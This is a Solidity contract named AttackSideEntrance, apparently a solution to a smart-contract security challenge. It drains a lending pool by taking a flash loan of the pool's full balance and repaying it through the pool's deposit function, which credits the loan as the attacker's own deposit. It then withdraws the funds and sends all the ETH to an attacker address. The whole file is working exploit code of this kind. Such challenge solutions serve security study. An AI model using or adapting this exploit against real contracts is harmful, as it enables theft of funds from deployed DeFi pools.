// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILenderPool {
  function deposit() external payable;
  function flashLoan(uint256 amount) external;
  function withdraw() external;
}

/**
 * @title AttackSideEntrance
 */
contract AttackSideEntrance {

    ILenderPool pool;
    uint256 poolBalance;

    constructor(address _pool) {
        pool = ILenderPool(_pool);
        poolBalance = address(pool).balance;
    }

    function run(address _attacker) public {
      pool.flashLoan(poolBalance);

      pool.withdraw();
      
      (bool result,) = _attacker.call{value: poolBalance}("");

      require(result, "Something goes wrong");

    }

    function execute() external payable {
      require(address(this).balance == poolBalance, "No enought ETH");

      // do something with the loan
      // ...

      // pay the loan back to the pool
      pool.deposit{value: msg.value}();
    }

    // needed to receive ETH
    receive() external payable {}
}
